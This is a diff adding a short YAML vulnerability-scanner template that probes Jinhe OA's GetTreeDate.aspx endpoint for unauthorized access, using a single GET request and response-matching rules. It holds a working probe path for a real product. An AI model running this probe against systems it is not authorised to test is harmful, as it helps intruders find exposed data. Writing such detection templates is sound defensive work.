@@ -1,0 +1,14 @@
+id: poc-yaml-jh-OA-GetTreeDate.aspx-unauthorized-access
+info:
+  name: 金和OA GetTreeDate.aspx 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 金和OA
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1
+  expression: status_code == 200 && contains(body,"\"permissions\":true") && contains(body,"GetTreeDate.aspx?nodeid=")
+    && contains(body,"\"checkstate\"") && content_type == "application/json"
+variables: {}
+transport: http
